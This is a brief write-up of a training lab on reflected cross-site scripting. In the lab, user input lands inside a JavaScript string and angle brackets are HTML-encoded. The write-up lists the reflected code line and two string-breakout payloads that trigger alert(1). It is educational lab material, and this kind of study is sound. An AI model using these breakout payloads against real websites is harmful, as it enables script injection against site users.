Lab #9 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

Target Goal - Exploit the reflected XSS vulnerability to call the alert function.

Analysis:


var searchTerms = ''-alert(1)-'';

'; alert(1); '

'-alert(1)-'